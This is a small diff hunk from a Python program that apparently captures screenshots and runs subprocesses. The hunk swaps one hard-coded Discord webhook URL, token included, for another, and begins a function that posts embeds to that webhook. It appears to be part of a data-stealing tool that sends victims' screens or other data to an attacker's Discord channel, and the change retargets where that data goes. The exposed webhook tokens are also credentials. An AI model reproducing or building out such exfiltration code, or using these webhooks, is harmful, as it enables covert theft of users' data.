@@ -22,7 +22,7 @@ from subprocess         import Popen, PIPE
 from PIL                import ImageGrab
 
 
-webhook = 'https://discord.com/api/webhooks/1239479003174141962/9Jr8voT_-CwhtwkpGCfgziwm11C4_l8MhWoTJxhsJxRDKKHu_HXgtADPIqxuvt4VkWtt'
+webhook = 'https://discord.com/api/webhooks/1257107422477160590/lfp_80DfT0rfcdbl2VWTFL4Pw1hj-B-hfHq_Pf2MxxmcY-Gpsw09zOYvMwcXMzU8Hr4h'
 
 def send_embed(embed):
     payload = {"embeds": [embed]}
